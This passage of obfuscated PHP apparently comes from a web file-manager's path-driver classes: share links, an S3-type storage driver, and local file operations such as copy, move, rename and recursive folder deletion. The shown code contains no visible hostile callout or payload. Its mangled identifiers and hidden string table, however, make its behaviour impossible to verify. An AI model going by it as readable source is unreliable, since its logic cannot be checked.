$Ï›ƒÚâƒ[12]); } if ($ú§õî¢­ && $ú§õî¢­[0] == $ÜŞˆü || !$ú§õî¢­ && $­‘“¤¹…[$Ï›ƒÚâƒ[194]] == $ÜŞˆü) { $¶İäø‹Ó = LNG($Ï›ƒÚâƒ[605]); $­‘“¤¹…[$Ï›ƒÚâƒ[606]] = $Ï›ƒÚâƒ[607]; } if ($ú§õî¢­ && $ú§õî¢­[0] == $¤»¬Åö“ || !$ú§õî¢­ && $­‘“¤¹…[$Ï›ƒÚâƒ[194]] == $¤»¬Åö“) { $¶İäø‹Ó = $¶İäø‹Ó . $Ï›ƒÚâƒ[608] . LNG($Ï›ƒÚâƒ[609]); } if (!$ú§õî¢­) { $­‘“¤¹…[$Ï›ƒÚâƒ[32]] = $¶İäø‹Ó; } } else { $Ù€ù†×ü = Model($Ï›ƒÚâƒ[602])->getInfoFull($­‘“¤¹…[$Ï›ƒÚâƒ[574]]); $‚ˆŠ«í = _get($Ù€ù†×ü, $Ï›ƒÚâƒ[604], $Ï›ƒÚâƒ[12]); $­‘“¤¹…[$Ï›ƒÚâƒ[610]] = Model($Ï›ƒÚâƒ[582])->getInfoSimpleOuter($­‘“¤¹…[$Ï›ƒÚâƒ[574]]); $¶İäø‹Ó = LNG($Ï›ƒÚâƒ[611]) . $Ï›ƒÚâƒ[176] . $­‘“¤¹…[$Ï›ƒÚâƒ[610]][$Ï›ƒÚâƒ[32]] . $Ï›ƒÚâƒ[178]; if ($ú§õî¢­ && $ú§õî¢­[0] == $‚ˆŠ«í || !$ú§õî¢­ && $­‘“¤¹…[$Ï›ƒÚâƒ[194]] == $‚ˆŠ«í) { $¶İäø‹Ó = LNG($Ï›ƒÚâƒ[611]) . $Ï›ƒÚâƒ[612] . $­‘“¤¹…[$Ï›ƒÚâƒ[610]][$Ï›ƒÚâƒ[32]] . $Ï›ƒÚâƒ[608] . LNG($Ï›ƒÚâƒ[609]) . $Ï›ƒÚâƒ[178]; } } } else { if ($­‘“¤¹…[$Ï›ƒÚâƒ[191]] == self::TYPE_GROUP) { $±ŸñÉ…„ = Model($Ï›ƒÚâƒ[590])->getInfoSimple($­‘“¤¹…[$Ï›ƒÚâƒ[574]]); $¶İäø‹Ó = $±ŸñÉ…„[$Ï›ƒÚâƒ[32]]; } else { if ($­‘“¤¹…[$Ï›ƒÚâƒ[191]] == self::TYPE_SYSTEM) { $¶İäø‹Ó = $Ï›ƒÚâƒ[613]; } } } $¶İäø‹Ó = $¶İäø‹Ó ? $Ï›ƒÚâƒ[8] . $¶İäø‹Ó . $Ï›ƒÚâƒ[8] : $Ï›ƒÚâƒ[8]; return $¶İäø‹Ó; } protected function _listAppendUser(&$ş–õ½Ëú) { $ß€®ãï =& $_SERVER[¼¥ÊĞÙÌ]; $ä¹Ú±¡ê = array_to_keyvalue($ş–õ½Ëú, $ß€®ãï[12], $ß€®ãï[530]); $µ”¬¬òß = array_to_keyvalue($ş–õ½Ëú, $ß€®ãï[12], $ß€®ãï[532]); $şı±àí‹ = array_merge($ä¹Ú±¡ê, $µ”¬¬òß); $é˜øÈ¡¤ = Model($ß€®ãï[602])->userListInfo($şı±àí‹); foreach ($ş–õ½Ëú as &$„çÑ”Û) { $¢Çìíú¸ = $„çÑ”Û[$ß€®ãï[530]]; $„çÑ”Û[$ß€®ãï[530]] = $é˜øÈ¡¤[$¢Çìíú¸] ? $é˜øÈ¡¤[$¢Çìíú¸] : !1; $¢Çìíú¸ = $„çÑ”Û[$ß€®ãï[532]]; $„çÑ”Û[$ß€®ãï[532]] = $é˜øÈ¡¤[$¢Çìíú¸] ? $é˜øÈ¡¤[$¢Çìíú¸] : !1; if (_get($„çÑ”Û, $ß€®ãï[614], 0)) { $òŒ˜Û¾š = $GLOBALS[$ß€®ãï[6]][$ß€®ãï[92]][$ß€®ãï[615]]; if ($„çÑ”Û[$ß€®ãï[544]][$ß€®ãï[616]] <= time() - $òŒ˜Û¾š) { $this->metaSet($„çÑ”Û[$ß€®ãï[194]], $ß€®ãï[617], null); $this->metaSet($„çÑ”Û[$ß€®ãï[194]], $ß€®ãï[616], null); unset($„çÑ”Û[$ß€®ãï[544]][$ß€®ãï[617]]); continue; } $Ùå¶ÊŒ = $„çÑ”Û[$ß€®ãï[544]][$ß€®ãï[617]]; $„çÑ”Û[$ß€®ãï[544]][$ß€®ãï[618]] = Model($ß€®ãï[602])->getInfoSimpleOuter($Ùå¶ÊŒ); } } unset($„çÑ”Û); } public function parentLevelArray($ÄöÅ­›ö) { $‡ñë•¬ =& $_SERVER[¼¥ÊĞÙÌ]; $ÄöÅ­›ö = explode($‡ñë•¬[50], trim($ÄöÅ­›ö, $‡ñë•¬[50])); return array_remove_value($ÄöÅ­›ö, $‡ñë•¬[231]); } public function listAll($Ñˆ´›üİ) { $ßµ‹şÛÂ =& $_SERVER[¼¥ÊĞÙÌ]; $ó¤Î±Û³ = $this->sourceInfo($Ñˆ´›üİ); $‚Çª¶šì = array($ßµ‹şÛÂ[619] => array($ßµ‹şÛÂ[620], $ó¤Î±Û³[$ßµ‹şÛÂ[589]] . $Ñˆ´›üİ . $ßµ‹şÛÂ[621]), $ßµ‹şÛÂ[622] => 0); $ÒòÓô¨  = $ßµ‹şÛÂ[623]; $”¥çˆâ = "\114\x45\x46\x54\x20\x4a\117\111\x4e\40{$this->tablePrefix}\x69\x6f\x5f\146\x69\154\145\x20\146\151\x6c\x65\x20\157\x6e\x20\163\157\x75\162\143\x65\x2e\x66\x69\154\x65\111\104\x20\75\x20\x66\x69\154\x65\x2e\x66\151\154\145\x49\x44"; $’­™Ş› = $this->alias($ßµ‹şÛÂ[522])->field($ÒòÓô¨ )->where($‚Çª¶šì)->join($”¥çˆâ)->select(); $this->_listAppendAuth($’­™Ş›); $this->_listAppendUser($’­™Ş›); $this->_listAppendPath($’­™Ş›); $’­™Ş› = array_to_keyvalue($’­™Ş›, $ßµ‹şÛÂ[194]); $óµ‹ïÛ„ = "\x2f{$ó¤Î±Û³[$ßµ‹şÛÂ[32]]}\x2f"; $óµ‹ïÛ„ = $óµ‹ïÛ„ == $ßµ‹şÛÂ[257] ? $ßµ‹şÛÂ[8] : $óµ‹ïÛ„; $Ş’«œŸÄ = array(); foreach ($’­™Ş› as $ôÕáĞ§¯ => $µ¨²öéí) { $¾†òğ¶Ô = $this->parentLevelArray($µ¨²öéí[$ßµ‹şÛÂ[589]]); array_shift($¾†òğ¶Ô); $ÔÔŠŒê¨ = $óµ‹ïÛ„; for ($’§óóÉ = 0; $’§óóÉ < count($¾†òğ¶Ô); $’§óóÉ++) { $ÔÔŠŒê¨ .= $’­™Ş›[$¾†òğ¶Ô[$’§óóÉ]][$ßµ‹şÛÂ[32]] . $ßµ‹şÛÂ[8]; } $ÔÔŠŒê¨ .= $µ¨²öéí[$ßµ‹şÛÂ[32]]; if ($µ¨²öéí[$ßµ‹şÛÂ[488]]) { $ÔÔŠŒê¨ .= $ßµ‹şÛÂ[8]; } $‘ğ¯İÏ» = array($ßµ‹şÛÂ[498] => str_replace($ßµ‹şÛÂ[257], $ßµ‹şÛÂ[8], str_replace($ßµ‹şÛÂ[257], $ßµ‹şÛÂ[8], str_replace($ßµ‹şÛÂ[257], $ßµ‹şÛÂ[8], $ÔÔŠŒê¨))), $ßµ‹şÛÂ[624] => intval($µ¨²öéí[$ßµ‹şÛÂ[488]]), $ßµ‹şÛÂ[625] => intval($µ¨²öéí[$ßµ‹şÛÂ[79]]), $ßµ‹şÛÂ[88] => intval($µ¨²öéí[$ßµ‹şÛÂ[88]]), $ßµ‹şÛÂ[90] => $this->pathInfoFilter($µ¨²öéí)); if (!$‘ğ¯İÏ»[$ßµ‹şÛÂ[488]]) { $‘ğ¯İÏ»[$ßµ‹şÛÂ[546]] = $µ¨²öéí[$ßµ‹şÛÂ[546]]; } $Ş’«œŸÄ[] = $‘ğ¯İÏ»; } $Ş’«œŸÄ = array_sort_by($Ş’«œŸÄ, $ßµ‹şÛÂ[87]); return $Ş’«œŸÄ; } } goto Cã‘”¢Š…ß; fÀ¥Ãè†§: class PathDriverDbShareLink extends PathDriverDB { public function __construct($ˆ¤æáÎú) { $this->pathParse = $ˆ¤æáÎú; $this->model = Model($_SERVER[¼¥ÊĞÙÌ][1440]); } protected function infoParse($šÔ·‘, $©±îÙô× = false, $Ôàóµµ“ = false) { $Ñ½‡£ëÅ =& $_SERVER[¼¥ÊĞÙÌ]; return Action($Ñ½‡£ëÅ[1268])->sharePathInfo($this->pathParse[$Ñ½‡£ëÅ[87]], !0, $©±îÙô×); } public function listPath($Ó–÷úôÊ, $ªÎ¿œá = false) { $Ì™ùÎ…ş =& $_SERVER[¼¥ÊĞÙÌ]; $Óì†Îİß = parent::listPath($Ó–÷úôÊ, $ªÎ¿œá); if (!$Óì†Îİß) { return $Óì†Îİß; } if (is_array($Óì†Îİß[$Ì™ùÎ…ş[1448]])) { $Óì†Îİß[$Ì™ùÎ…ş[1448]] = Action($Ì™ùÎ…ş[1268])->shareItemInfo($Óì†Îİß[$Ì™ùÎ…ş[1448]]); } foreach ($Óì†Îİß as $¤µçÑùÖ => $ñİñòÛ) { if (!in_array($¤µçÑùÖ, array($Ì™ùÎ…ş[86], $Ì™ùÎ…ş[85]))) { continue; } foreach ($ñİñòÛ as $’’ğŸ¶ => $ô¯É®­Á) { $Óì†Îİß[$¤µçÑùÖ][$’’ğŸ¶] = Action($Ì™ùÎ…ş[1268])->shareItemInfo($ô¯É®­Á); } } return $Óì†Îİß; } public function listAll($‚Ü ô¹²) { $•…úæÊÏ =& $_SERVER[¼¥ÊĞÙÌ]; $Ìãî•ßß = IO::info($this->pathParse[$•…úæÊÏ[87]]); if (!$Ìãî•ßß) { return array(); } $ˆÜÖ°”Ú = $this->model->listAll($‚Ü ô¹²); foreach ($ˆÜÖ°”Ú as &$ôõßé‹Ù) { $ôõßé‹Ù[$•…úæÊÏ[90]] = Action($•…úæÊÏ[1268])->shareItemInfo($ôõßé‹Ù[$•…úæÊÏ[90]]); } unset($ôõßé‹Ù); return $ˆÜÖ°”Ú; } } class PathDriverDriverShareItem { public function __construct($‰´ó¦Â¼) { $this->pathParse = $‰´ó¦Â¼; } public function __call($„„¢³§ò, $Û©£Ä) { $—”Ò„œş =& $_SERVER[¼¥ÊĞÙÌ]; if (method_exists($this, $„„¢³§ò)) { return; } $˜²Ä¬²ä = call_user_func_array(array($—”Ò„œş[1449], $„„¢³§ò), $Û©£Ä); $½ÂÄ = array($—”Ò„œş[1450], $—”Ò„œş[1451], $—”Ò„œş[1452], $—”Ò„œş[1453], $—”Ò„œş[626], $—”Ò„œş[628], $—”Ò„œş[1454], $—”Ò„œş[110], $—”Ò„œş[1455], $—”Ò„œş[1456]); if (in_array($„„¢³§ò, $½ÂÄ)) { $˜²Ä¬²ä = $this->getPathOuter($˜²Ä¬²ä); } return $˜²Ä¬²ä; } public function copy($…ª«­ß, $éÙ‹‡­“, $õ²ê¶Ã = false, $ÇŒ«µ = false) { return $this->copyMove($…ª«­ß, $éÙ‹‡­“, $õ²ê¶Ã, $_SERVER[¼¥ÊĞÙÌ][626], $ÇŒ«µ); } public function move($É¾Ô€˜Æ, $©”Ôı, $ˆ­¢¥º­ = false, $À¼àËÊÈ = false) { return $this->copyMove($É¾Ô€˜Æ, $©”Ôı, $ˆ­¢¥º­, $_SERVER[¼¥ÊĞÙÌ][628], $À¼àËÊÈ); } private function copyMove($”€Ø¤Ïß, $­÷»ô…, $æ¾€Ï¥·, $ĞÇ™¶´‘, $Î„²îØÀ = false) { $«¼—ß‹‹ =& $_SERVER[¼¥ÊĞÙÌ]; $Ö¾Ê€”€ = $­÷»ô…; $”Ëù×Ò = IO::driverMake($­÷»ô…); if ($”Ëù×Ò->pathParse[$«¼—ß‹‹[1242]]) { $­÷»ô… = $”Ëù×Ò->pathParse[$«¼—ß‹‹[1242]]; } else { $­÷»ô… = $Ö¾Ê€”€; } $´Š¨ŒÔ§ = IO::copyMove($”€Ø¤Ïß, $­÷»ô…, $æ¾€Ï¥·, $ĞÇ™¶´‘, $Î„²îØÀ); $´Š¨ŒÔ§ = $this->getPathOuter($´Š¨ŒÔ§); return $´Š¨ŒÔ§; } public function pathThis($ ¶ªÂ) { return get_path_this($this->pathParse[$_SERVER[¼¥ÊĞÙÌ][87]]); } public function pathFather($ò›ë¨ÑÑ) { return get_path_father($this->pathParse[$_SERVER[¼¥ÊĞÙÌ][87]]); } public function iconvSystem($’âéªá) { return $’âéªá; } protected function infoParse($¢ÎŒª…Û, $ÍËïËÈĞ = false) { $Éº•¼’œ =& $_SERVER[¼¥ÊĞÙÌ]; $î„Ø¿ˆ® = $this->pathParse[$Éº•¼’œ[565]][$Éº•¼’œ[1269]] . $this->pathParse[$Éº•¼’œ[1261]]; if ($ÍËïËÈĞ) { $£‘»æ‹è = IO::infoWithChildren($î„Ø¿ˆ®); } else { $£‘»æ‹è = IO::info($î„Ø¿ˆ®); } $ÔºÎµÈ“ = $this->pathParse[$Éº•¼’œ[565]]; return Action($Éº•¼’œ[1447])->_shareItemeParse($£‘»æ‹è, $ÔºÎµÈ“); } public function listAll($Ô ¢ì…) { $¹›Îü›ò =& $_SERVER[¼¥ÊĞÙÌ]; $ªíğ€‹ä = IO::listAll($Ô ¢ì…); $êü©¸¡á = rtrim($this->pathParse[$¹›Îü›ò[565]][$¹›Îü›ò[1269]], $¹›Îü›ò[8]); foreach ($ªíğ€‹ä as &$÷¶ÑãØÀ) { $÷¶ÑãØÀ[$¹›Îü›ò[87]] = $this->pathDriver . $¹›Îü›ò[8] . ltrim(substr($÷¶ÑãØÀ[$¹›Îü›ò[87]], strlen($êü©¸¡á)), $¹›Îü›ò[8]); } unset($÷¶ÑãØÀ); return $ªíğ€‹ä; } public function listAllSimple($§Ÿª´ÂÀ, $¢‘Ì÷Â® = false) { $¹¯÷¦´ =& $_SERVER[¼¥ÊĞÙÌ]; $±ü¾Èü = $this->listAll($§Ÿª´ÂÀ); $âæ¢³ÆÉ = $this->pathParse[$¹¯÷¦´[498]]; if (trim($âæ¢³ÆÉ, $¹¯÷¦´[8]) == trim(get_path_father($âæ¢³ÆÉ), $¹¯÷¦´[8])) { $¢‘Ì÷Â® = !0; } return IO::init($¹¯÷¦´[12])->listAllSimpleMake($±ü¾Èü, $âæ¢³ÆÉ, $¢‘Ì÷Â®); } public function getPathOuter($ƒ©Ô­×) { $¨î¯­‰ =& $_SERVER[¼¥ÊĞÙÌ]; $»›¡àçë = KodIO::parse($ƒ©Ô­×); if ($»›¡àçë[$¨î¯­‰[33]] == KodIO::KOD_SHARE_ITEM) { return $»›¡àçë[$¨î¯­‰[87]]; } $²§¹ï¨ˆ = KodIO::clear($ƒ©Ô­×); $¹¦”ğë = KodIO::clear($this->pathParse[$¨î¯­‰[565]][$¨î¯­‰[1269]]); $­®Ùù“² = substr($²§¹ï¨ˆ, strlen($¹¦”ğë)); if (substr($²§¹ï¨ˆ, 0, strlen($¹¦”ğë)) != $¹¦”ğë) { return !1; } return $this->pathParse[$¨î¯­‰[1262]] . $¨î¯­‰[8] . ltrim($­®Ùù“², $¨î¯­‰[8]); } public function getType() { $¾¹Æí¯Ú =& $_SERVER[¼¥ÊĞÙÌ]; $ÆìöÇœ = str_replace($¾¹Æí¯Ú[77], $¾¹Æí¯Ú[12], get_class($this)); return strtolower($ÆìöÇœ); } public function isOsDriver($üÇíŞÌÒ) { return IO::isOsDriver($üÇíŞÌÒ); } public function info($’³¦ë–²) { return $this->infoParse($’³¦ë–²); } public function infoAuth($ñëœ´Âù) { return $this->infoParse($ñëœ´Âù); } public function infoWithChildren($üÎÇÃ‰â) { return $this->infoParse($üÎÇÃ‰â, !0); } public function infoFull($´¬ÖŸ•ş) { return $this->infoParse($´¬ÖŸ•ş); } } class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($ùŒòƒ…é) { $this->pathParse = $ùŒòƒ…é; } protected function infoParse($±Ñ§¢¬Ó, $÷æÑİÎÒ = false) { $ÆÃÀğì =& $_SERVER[¼¥ÊĞÙÌ]; return Action($ÆÃÀğì[1268])->sharePathInfo($this->pathParse[$ÆÃÀğì[87]], !0, $÷æÑİÎÒ); } public function listPath($Ÿ«²¿Â‡, $»¸¥åœ¦ = false) { $©ÌÁíãÉ =& $_SERVER[¼¥ÊĞÙÌ]; $Îì¬ÏÎå = IO::listPath($Ÿ«²¿Â‡, $»¸¥åœ¦); if (!$Îì¬ÏÎå) { return $Îì¬ÏÎå; } if (is_array($Îì¬ÏÎå[$©ÌÁíãÉ[1448]])) { $Û«üƒŠõ = Action($©ÌÁíãÉ[1457])->parsePathChildren($Îì¬ÏÎå[$©ÌÁíãÉ[1448]], array($©ÌÁíãÉ[498] => $Ÿ«²¿Â‡)); $Îì¬ÏÎå[$©ÌÁíãÉ[1448]] = Action($©ÌÁíãÉ[1268])->shareItemInfo($Û«üƒŠõ); } foreach ($Îì¬ÏÎå as $Ó…Ì®±á => $º½Ãí³Â) { if (!in_array($Ó…Ì®±á, array($©ÌÁíãÉ[86], $©ÌÁíãÉ[85]))) { continue; } foreach ($º½Ãí³Â as $ÚàÌšªµ => $Û«üƒŠõ) { $Û«üƒŠõ = Action($©ÌÁíãÉ[1457])->parsePathChildren($Û«üƒŠõ, array($©ÌÁíãÉ[498] => $Ÿ«²¿Â‡)); $Îì¬ÏÎå[$Ó…Ì®±á][$ÚàÌšªµ] = Action($©ÌÁíãÉ[1268])->shareItemInfo($Û«üƒŠõ); } } return $Îì¬ÏÎå; } } goto BÎö•¹‰’; eéö„„º¹º: class PathDriverJOS extends PathDriverBaseS3 { public function __construct($¹ÚÃŸıÏ) { parent::__construct($¹ÚÃŸıÏ); $this->setSignVersion($_SERVER[¼¥ÊĞÙÌ][250]); } public function uploadLink($¹®‹×ş², $‘×üùŸ = 0) { $Ä¥šä“Í =& $_SERVER[¼¥ÊĞÙÌ]; if ($this->isUploadServer()) { return; } $˜ü›ß•‘ = $this->getType(); if (!in_array($˜ü›ß•‘, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $™£Ííû = (!$‘×üùŸ ? 1 : ceil($‘×üùŸ / pow(1024, 3))) * 3600 * 4; $ìÓşØ˜™ = $this->uploadMultiData($¹®‹×ş², $™£Ííû); if ($ìÓşØ˜™) { $ìÓşØ˜™[$Ä¥šä“Í[97]] = $¹®‹×ş²; $ìÓşØ˜™[$Ä¥šä“Í[98]] = $˜ü›ß•‘; } return $ìÓşØ˜™; } public function fileOutImage($ç‹øì—ì, $Ë¿øóã = 250) { if ($this->size($ç‹øì—ì) > 1024 * 1024 * 25) { return $this->fileOutImageServer($ç‹øì—ì, $Ë¿øóã); } $¶§˜šå = $this->link($ç‹øì—ì); $¶§˜šå .= $_SERVER[¼¥ÊĞÙÌ][1473] . $Ë¿øóã; $this->fileOutLink($¶§˜šå); } } class PathDriverLocal extends PathDriverBase { private $pathAuth; public function __construct() { parent::__construct(); $this->pathAuth = DEFAULT_PERRMISSIONS; } public function getPath($é–Ñßè) { if (substr($é–Ñßè, 0, 2) == $_SERVER[¼¥ÊĞÙÌ][1430]) { $é–Ñßè = BASIC_PATH . substr($é–Ñßè, 2); } return $é–Ñßè; } public function iconvApp($·¾é®î) { $Î¼”Æ =& $_SERVER[¼¥ÊĞÙÌ]; global $config; return $this->iconvTo($·¾é®î, $config[$Î¼”Æ[1459]], $config[$Î¼”Æ[1458]]); } public function iconvSystem($”³šø×²) { $Î¬ùšÚÎ =& $_SERVER[¼¥ÊĞÙÌ]; global $config; return $this->iconvTo($”³šø×², $config[$Î¬ùšÚÎ[1458]], $config[$Î¬ùšÚÎ[1459]]); } public function getPathOuter($·Ë×¾ˆ“) { $¸—ì’È¯ =& $_SERVER[¼¥ÊĞÙÌ]; $áÖÒÓ„ = $this->iconvApp($this->pathBase); $·Ë×¾ˆ“ = $this->iconvApp($·Ë×¾ˆ“); if (substr($áÖÒÓ„, 0, 2) == $¸—ì’È¯[1430]) { $áÖÒÓ„ = BASIC_PATH . substr($áÖÒÓ„, 2); } if (substr($·Ë×¾ˆ“, 0, 2) == $¸—ì’È¯[1430]) { $·Ë×¾ˆ“ = BASIC_PATH . substr($·Ë×¾ˆ“, 2); } $áÖÒÓ„ = KodIO::clear($áÖÒÓ„); $·Ë×¾ˆ“ = KodIO::clear($·Ë×¾ˆ“); $·Ë×¾ˆ“ = substr($·Ë×¾ˆ“, strlen($áÖÒÓ„)); if (empty($this->pathDriver)) { return $·Ë×¾ˆ“; } return $this->pathDriver . $¸—ì’È¯[8] . ltrim($·Ë×¾ˆ“, $¸—ì’È¯[8]); } public function mkfile($­–¢ö‹æ, $–æ—Œ³ = '', $õÀúã¶ = REPEAT_RENAME) { $­–¢ö‹æ = $this->iconvSystem($­–¢ö‹æ); @touch($­–¢ö‹æ); if ($–æ—Œ³) { file_put_contents($­–¢ö‹æ, $–æ—Œ³); } @chmod($­–¢ö‹æ, $this->pathAuth); if (is_file($­–¢ö‹æ)) { return $this->getPathOuter($­–¢ö‹æ); } $this->writeLog(__FUNCTION__ . $_SERVER[¼¥ÊĞÙÌ][1470], !0); return !1; } public function mkdir($×èÅ¼Îö, $Î¤¶»èÒ = REPEAT_SKIP) { $×èÅ¼Îö = $this->iconvSystem($×èÅ¼Îö); if (is_dir($×èÅ¼Îö)) { return $this->getPathOuter($×èÅ¼Îö); } @mkdir($×èÅ¼Îö, $this->pathAuth, !0); @chmod($×èÅ¼Îö, $this->pathAuth); if (is_dir($×èÅ¼Îö)) { return $this->getPathOuter($×èÅ¼Îö); } $this->writeLog(__FUNCTION__ . $_SERVER[¼¥ÊĞÙÌ][1470], !0); return !1; } public function copyFile($ è™êÕ, $ŸãÉ«È) { $this->mkdir($this->pathFather($ŸãÉ«È)); $ è™êÕ = $this->iconvSystem($ è™êÕ); $ŸãÉ«È = $this->iconvSystem($ŸãÉ«È); $áÃï ¹› = copy_64($ è™êÕ, $ŸãÉ«È); @chmod($ŸãÉ«È, $this->pathAuth); if ($áÃï ¹›) { return $this->getPathOuter($ŸãÉ«È); } $this->writeLog(__FUNCTION__ . $_SERVER[¼¥ÊĞÙÌ][1470], !0); return !1; } public function moveFile($è™åÍÖ‘, $ñ«ğ¡Û) { $this->mkdir($this->pathFather($ñ«ğ¡Û)); $è™åÍÖ‘ = $this->iconvSystem($è™åÍÖ‘); $ñ«ğ¡Û = $this->iconvSystem($ñ«ğ¡Û); $¿‹ŸÅÄ = intval(@rename($è™åÍÖ‘, $ñ«ğ¡Û)); if (!$¿‹ŸÅÄ) { if ($¿‹ŸÅÄ = intval(@copy_64($è™åÍÖ‘, $ñ«ğ¡Û))) { @unlink($è™åÍÖ‘); } } @chmod($ñ«ğ¡Û, $this->pathAuth); if ($¿‹ŸÅÄ) { return $this->getPathOuter($ñ«ğ¡Û); } $this->writeLog(__FUNCTION__ . $_SERVER[¼¥ÊĞÙÌ][1470], !0); return !1; } public function movePath($Õİë·ÃÒ, $´Û”§Â, $½É¿…ìæ = false) { $›…µÏ³¿ =& $_SERVER[¼¥ÊĞÙÌ]; $Õİë·ÃÒ = $this->iconvSystem($Õİë·ÃÒ); $´Û”§Â = $this->iconvSystem($´Û”§Â); $ˆ…øù“ = rtrim($´Û”§Â, $›…µÏ³¿[8]) . $›…µÏ³¿[8] . ($½É¿…ìæ ? $½É¿…ìæ : get_path_this($Õİë·ÃÒ)); if (file_exists($ˆ…øù“)) { return !1; } $¯›§Ğúú = intval(@rename($Õİë·ÃÒ, $ˆ…øù“)); $¯›§Ğúú = file_exists($ˆ…øù“); if ($¯›§Ğúú) { return $this->getPathOuter($ˆ…øù“); } $this->writeLog(__FUNCTION__ . $›…µÏ³¿[1470], !0); return !1; } public function delFile($Ú–ƒæğÍ) { $Ú–ƒæğÍ = $this->iconvSystem($Ú–ƒæğÍ); if (!@unlink($Ú–ƒæğÍ)) { @chmod($Ú–ƒæğÍ, $this->pathAuth); if (@unlink($Ú–ƒæğÍ)) { return !0; } $this->writeLog(__FUNCTION__ . $_SERVER[¼¥ÊĞÙÌ][1470], !0); return !1; } return !0; } public function delFolder($˜­ë“ï‰) { $òŠĞˆäÒ =& $_SERVER[¼¥ÊĞÙÌ]; $˜­ë“ï‰ = $this->iconvSystem($˜­ë“ï‰); if (!is_dir($˜­ë“ï‰)) { return !0; } if (!($Íú©Šš = opendir($˜­ë“ï‰))) { return !1; } while (($ÊÄƒÊµ = readdir($Íú©Šš)) !== !1) { if ($ÊÄƒÊµ == $òŠĞˆäÒ[10] || $ÊÄƒÊµ == $òŠĞˆäÒ[1375]) { continue; } $ÄÔ·²©È = $˜­ë“ï‰ . $òŠĞˆäÒ[8] . $ÊÄƒÊµ; if (is_file($ÄÔ·²©È) || is_link($ÄÔ·²©È)) { if (!unlink($ÄÔ·²©È)) { chmod($ÄÔ·²©È, $this->pathAuth); if (!unlink($ÄÔ·²©È)) { return !1; } } } else { if (is_dir($ÄÔ·²©È)) { chmod($ÄÔ·²©È, $this->pathAuth); $ÄÔ·²©È = $this->iconvApp($ÄÔ·²©È); if (!$this->delFolder($ÄÔ·²©È)) { return !1; } } } } closedir($Íú©Šš); return rmdir($˜­ë“ï‰); } public function rename($ñ’™ÛÀ¤, $–Æè’öÜ) { $ë¬ö¿¥Å =& $_SERVER[¼¥ÊĞÙÌ]; $°ïˆ«ŒŞ = $this->fileNameAuto($this->pathFather($ñ’™ÛÀ¤), $–Æè’öÜ); $°ïˆ«ŒŞ = $this->iconvSystem($°ïˆ«ŒŞ); $ñ’™ÛÀ¤ = $this->iconvSystem($ñ’™ÛÀ¤); $´øâûíá = $this->pathFather($ñ’™ÛÀ¤); $úÂİ³‡ü = rtrim($´øâûíá, $ë¬ö¿¥Å[8]) . $ë¬ö¿¥Å[8] . $°ïˆ«ŒŞ; $ˆì¦°¼Ô = @rename($ñ’™ÛÀ¤, $úÂİ³‡ü); $úÂİ³‡ü = $this->iconvApp($úÂİ³‡ü); if ($ˆì¦°¼Ô) { return $this->getPathOuter($úÂİ³‡ü); } $this->writeLog(__FUNCTION__ . $ë¬ö¿¥Å[1470], !0); return !1; } public function size($äå¨ ¼) { $äå¨ ¼ = $this->iconvSystem($äå¨ ¼); return filesize_64($äå¨ ¼); } public function info($„ËÁ­Í…) { $„ËÁ­Í… = $this->iconvSystem($„ËÁ­Í…); if ($this->isFolder($„ËÁ­Í…)) { return $this->folderInfo($„ËÁ­Í…); } else { if ($this->isFile($„ËÁ­Í…)) { return $this->fileInfo($„ËÁ­Í…); } } return !1; } protected function infoChildren($¨éš¸øè, &$—Îêãİ, $¡³ç‰òê = true) { $´°´»¿ =& $_SERVER[¼¥ÊĞÙÌ]; check_abort_echo(); $¨éš¸øè = rtrim($¨éš¸øè, $´°´»¿[8]) . $´°´»¿[8]; if ($¡³ç‰òê) { $¨éš¸øè = $this->iconvSystem($¨éš¸øè); } if (!($ ¢•ı­ã = @opendir($¨éš¸øè))) { return; } while (($ÕäÒŒµ = readdir($ ¢•ı­ã)) !== !1) { if ($ÕäÒŒµ == $´°´»¿[10] || $ÕäÒŒµ == $´°´»¿[1375]) { continue; } $…ÎòÓ²á = $¨éš¸øè . $ÕäÒŒµ; if (is_file($…ÎòÓ²á) || is_link($…ÎòÓ²á)) { $—Îêãİ[$´°´»¿[80]]++; $—Îêãİ[$´°´»¿[79]] += filesize_64($…ÎòÓ²á); } else { if (is_dir($…ÎòÓ²á)) { $—Îêãİ[$´°´»¿[81]]++; $this->infoChildren($…ÎòÓ²á, $—Îêãİ, !1); } } } closedir($ ¢•ı­ã); } private function folderInfo($¯°Ø‘íÎ, $¥³¶ˆÖÜ = false) { $§ËøÓÆË =& $_SERVER[¼¥ÊĞÙÌ]; $¯°Ø‘íÎ = rtrim($¯°Ø‘íÎ, $§ËøÓÆË[8]) . $§ËøÓÆË[8]; $ƒ¿ãæ¢¹ = $this->iconvApp($this->pathThis($¯°Ø‘íÎ)); if ($¥³¶ˆÖÜ) { return array($§ËøÓÆË[32] => $ƒ¿ãæ¢¹, $§ËøÓÆË[87] => $this->getPathOuter($¯°Ø‘íÎ), $§ËøÓÆË[33] => $§ËøÓÆË[78]); } $ìØ–Ëí = array($§ËøÓÆË[32] => $ƒ¿ãæ¢¹, $§ËøÓÆË[87] => $this->getPathOuter($¯°Ø‘íÎ), $§ËøÓÆË[33] => $§ËøÓÆË[78], $§ËøÓÆË[234] => @filectime($¯°Ø‘íÎ), $§ËøÓÆË[88] => @filemtime($¯°Ø‘íÎ), $§ËøÓÆË[1474] => @fileatime($¯°Ø‘íÎ), $§ËøÓÆË[1475] => is_readable($¯°Ø‘íÎ), $§ËøÓÆË[1476] => is_writable($¯°Ø‘íÎ), $§ËøÓÆË[1477] => get_mode($¯°Ø‘íÎ)); return $ìØ–Ëí; } private function fileInfo($œ¤¹ëÏ¢, $ ºÆïÇ = false) { $î¡¤©Å¥ =& $_SERVER[¼¥ÊĞÙÌ]; $“¹‹‰²„ = $this->iconvApp($this->pathThis($œ¤¹ëÏ¢)); if ($ ºÆïÇ) { return array($î¡¤©Å¥[32] => $“¹‹‰²„, $î¡¤©Å¥[87] => $this->getPathOuter($œ¤¹ëÏ¢), $î¡¤©Å¥[33] => $î¡¤©Å¥[233], $î¡¤©Å¥[79] => $this->size($œ¤¹ëÏ¢), $î¡¤©Å¥[169] => $this->ext($“¹‹‰²„)); } $Ò±§»ãÑ = array($î¡¤©Å¥[32] => $“¹‹‰²„, $î¡¤©Å¥[87] => $this->getPathOuter($œ¤¹ëÏ¢), $î¡¤©Å¥[33] => $î¡¤©Å¥[233], $î¡¤©Å¥[234] => @filectime($œ¤¹ëÏ¢), $î¡¤©Å¥[88] => @filemtime($œ¤¹ëÏ¢), 